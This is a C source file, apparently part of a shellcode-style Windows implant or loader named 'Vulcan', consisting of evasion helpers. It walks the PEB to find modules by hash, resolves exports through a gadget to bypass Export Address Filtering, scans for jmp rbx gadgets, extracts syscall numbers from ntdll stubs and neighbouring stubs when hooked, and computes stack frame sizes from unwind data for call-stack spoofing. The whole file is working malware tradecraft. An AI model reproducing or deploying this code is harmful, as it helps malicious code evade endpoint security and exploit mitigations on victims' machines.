#include "Ntdll.h"
#include "Macros.h"
#include "Instance.h"
#include "Vulcan.h"

D_SEC(B)
DWORD HashStringA(
    _In_    LPSTR   str
)
{
	DWORD dwHash = 0x1337;
	BYTE c;

	while (c = *str++)
	{
		if (c >= 'a' && c <= 'z')
			c -= 'a' - 'A';

		dwHash = ((dwHash << 0x5) + dwHash) + c;
	}
	return dwHash;
}

D_SEC(B)
DWORD HashStringW(
    _In_    LPWSTR  str
)
{
	DWORD dwHash = 0x1337;
	WCHAR c;
	while (c = *str++)
	{
		if (c >= L'a' && c <= L'z')
			c -= L'a' - L'A';
		dwHash = ((dwHash << 0x5) + dwHash) + c;
	}
	return dwHash;
}

D_SEC(B)
PVOID	ResolveEafGadgetAddress(
	_In_	PVOID	pModule
)
{
	PVOID	pTextSection = (PVOID)(
		C_DW64(pModule) + 0x1000
		);

	for (int i = 0; ; i++) {
		if (
			((PBYTE)pTextSection)[i]	 == 0x48	&& 
			((PBYTE)pTextSection)[i + 1] == 0x8B	&&
			((PBYTE)pTextSection)[i + 2] == 0x00	&&
			((PBYTE)pTextSection)[i + 3] == 0xC3
			) 
		
		{
			return (PVOID)(
				C_DW64(pTextSection) + i
				);
		}
	}

	return NULL;
}

D_SEC(B)
PVOID ResolveJmpRbxGadget(
	_In_	PVOID	    pModuleAddr
)
{
	PVOID pModTextSection = (PVOID)(
		C_DW64(pModuleAddr) + 0x1000
	);

	for (int i = 0; ; i++)
	{
		if (
			((PBYTE)pModTextSection)[i] == 0xFF &&
			((PBYTE)pModTextSection)[i + 1] == 0x23
			)
		{
  			return (PVOID)(
				C_DW64(pModTextSection) + i);
            
            
		}
	}

	return NULL;
}

D_SEC(B)
PVOID ResolveModuleAddressWithHash(
    _In_    DWORD   dwModuleHash
    )
{
	PTEB pTeb = (PTEB)__readgsqword(0x30);
	PPEB pPeb = pTeb->ProcessEnvironmentBlock;

	void* firstEntry = pPeb->Ldr->InLoadOrderModuleList.Flink;
	PLIST_ENTRY parser = (PLIST_ENTRY)firstEntry;

	do
	{
		PLDR_DATA_TABLE_ENTRY content = (PLDR_DATA_TABLE_ENTRY)parser;

		if (dwModuleHash == 0)
		{
			return content->DllBase;
		}

		if (HashStringW(content->BaseDllName.Buffer) == dwModuleHash)
		{
			return content->DllBase;
		}

		parser = parser->Flink;
	} while (parser->Flink != firstEntry);

	return NULL;
}

D_SEC(B)
PVOID ResolveProcedureAddressWithHash(
	_In_	PVOID	pGadgetRead,
    _In_    PVOID   pModuleAddr, 
    _In_    DWORD   dwProcHash
    )
{


	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pModuleAddr;
	if (EAF_READ_W(&pDosHeader->e_magic) != IMAGE_DOS_SIGNATURE) {
		return NULL;
	}
	
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(
		C_DW64(pModuleAddr) + EAF_READ_DW32(&pDosHeader->e_lfanew)
		);

	if (EAF_READ_DW32(&pNtHeaders->Signature) != IMAGE_NT_SIGNATURE) {
		return NULL;
	}

	PIMAGE_EXPORT_DIRECTORY pImgExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(
		C_DW64(pModuleAddr) + EAF_READ_DW32(&pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress)
		);

	PDWORD pdwAddressOfFunctions = (PDWORD)(
		C_DW64(pModuleAddr) + EAF_READ_DW32(&pImgExportDirectory->AddressOfFunctions)
		);

	PDWORD pdwAddressOfNames = (PDWORD)(
		C_DW64(pModuleAddr) + EAF_READ_DW32(&pImgExportDirectory->AddressOfNames)
		);

	PWORD pwAddressOfNameOrdinales = (PWORD)(
		C_DW64(pModuleAddr) + EAF_READ_DW32(&pImgExportDirectory->AddressOfNameOrdinals)
		);


	for (int i = 0; i < pImgExportDirectory->NumberOfFunctions; i++)
	{
		PBYTE	pFunctionName = (
			C_DW64(pModuleAddr) + EAF_READ_DW32(&pdwAddressOfNames[i])
			);

		if (HashStringA(pFunctionName) == dwProcHash)
		{
			PVOID	pFunctionAddress = (
				C_DW64(pModuleAddr) + EAF_READ_DW32(&pdwAddressOfFunctions[pwAddressOfNameOrdinales[i]])
				);

			return pFunctionAddress;
		}

	}
	return NULL;
}

D_SEC(B)
BOOL	ResolveSyscallWithHash(
	_In_	PVOID	pFunction,
	_Inout_	PDWORD	pdwSyscall,
	_Inout_ PVOID* ppGadget
)
{
	if (
		*(PBYTE)((PBYTE)pFunction) == 0x4C &&
		*(PBYTE)((PBYTE)pFunction + 1) == 0x8B &&
		*(PBYTE)((PBYTE)pFunction + 2) == 0xD1 &&
		*(PBYTE)((PBYTE)pFunction + 3) == 0xB8 &&
		*(PBYTE)((PBYTE)pFunction + 6) == 0x00 &&
		*(PBYTE)((PBYTE)pFunction + 7) == 0x00
		)
	{
		BYTE high = ((PBYTE)pFunction)[5];
		BYTE low = ((PBYTE)pFunction)[4];

		*pdwSyscall = (high << 8) | low;
		*ppGadget = ((DWORD64)pFunction + SYSCALL_GADGET_OFFSET);

		return TRUE;
	}
	else {
		for (int i = 1; i < 500; i++)
		{
			if (
				*(PBYTE)((PBYTE)pFunction + i * DOWN) == 0x4C &&
				*(PBYTE)((PBYTE)pFunction + 1 + i * DOWN) == 0x8B &&
				*(PBYTE)((PBYTE)pFunction + 2 + i * DOWN) == 0xD1 &&
				*(PBYTE)((PBYTE)pFunction + 3 + i * DOWN) == 0xB8 &&
				*(PBYTE)((PBYTE)pFunction + 6 + i * DOWN) == 0x00 &&
				*(PBYTE)((PBYTE)pFunction + 7 + i * DOWN) == 0x00
				)
			{
				BYTE high = ((PBYTE)pFunction)[5 + i * DOWN];
				BYTE low = ((PBYTE)pFunction)[4 + i * DOWN];

				*pdwSyscall = (high << 8) | low;
				*ppGadget = ((DWORD64)pFunction + SYSCALL_GADGET_OFFSET);

				return TRUE;
			}
		}
	}

	return FALSE;
}


D_SEC(B)
DWORD CalculateStackSize(
	_In_    PRUNTIME_FUNCTION   pRuntimeFunction,
	_In_    DWORD64             dwImageBase
)
{
	PUNWIND_INFO    pUnwindInfo = NULL;
	DWORD           UnwindOperation = 0;
	DWORD           OperationInfo = 0;
	DWORD           Index = 0;
	DWORD           FrameOffset = 0;
	DWORD           dwTotalStackSize = 0;

	if (!pRuntimeFunction) {
		return 0;
	}

	pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + dwImageBase);

	while (Index < pUnwindInfo->CountOfCodes) {
		UnwindOperation = pUnwindInfo->UnwindCode[Index].UnwindOp;
		OperationInfo = pUnwindInfo->UnwindCode[Index].OpInfo;

		switch (UnwindOperation)
		{
		case UWOP_PUSH_NONVOL:
			dwTotalStackSize += 8;
			break;

		case UWOP_SAVE_NONVOL:
			Index += 1;
			break;

		case UWOP_ALLOC_SMALL:
			dwTotalStackSize += ((OperationInfo * 8) + 8);
			break;

		case UWOP_ALLOC_LARGE:
		{
			Index += 1;
			FrameOffset = pUnwindInfo->UnwindCode[Index].FrameOffset;
			if (OperationInfo == 0) {
				FrameOffset *= 8;
			}
			else {
				Index += 1;
				FrameOffset += (pUnwindInfo->UnwindCode[Index].FrameOffset << 16);
			}
			dwTotalStackSize += FrameOffset;
			break;
		}

		case UWOP_SET_FPREG:
			break;

		default:
			break;
		}

		Index += 1;
	}

	if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO)) {
		Index = pUnwindInfo->CountOfCodes;
		if (0 != (Index & 1)) {
			Index += 1;
		}
		pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[Index]);
		return CalculateStackSize(pRuntimeFunction, dwImageBase);
	}

	dwTotalStackSize += 8;

	return dwTotalStackSize;
}

D_SEC(B)
BOOL CalculateFunctionStackSizeWrapper(
	_In_	PINSTANCE	Inst,
	_In_    PVOID   	pFunction,
	_Inout_ PDWORD  	pdwStackSize
)
{
	PRUNTIME_FUNCTION       pRuntimeFunction = NULL;
	DWORD64                 dwImageBase = 0;
	PUNWIND_HISTORY_TABLE   pHistoryTable = NULL;

	if (!pFunction) {
		return FALSE;
	}

	pRuntimeFunction = Inst->RtlLookupFunctionEntry((DWORD64)pFunction, &dwImageBase, pHistoryTable);
	if (!pRuntimeFunction) {
		return FALSE;
	}

	*pdwStackSize = CalculateStackSize(pRuntimeFunction, dwImageBase);

	if (*pdwStackSize) {
		return TRUE;
	}

	return FALSE;
}

D_SEC(B)
VOID xMemcpy(
    _In_    PBYTE   dst, 
    _In_    PBYTE   src, 
    _In_    DWORD   size
    )
{
	while (size--)
		dst[size] = src[size];
}

D_SEC(B)
VOID xMemset(
    _In_    PBYTE   dst, 
    _In_    BYTE    c, 
    _In_    DWORD   size
    )
{
	while (size--)
		dst[size] = c;
}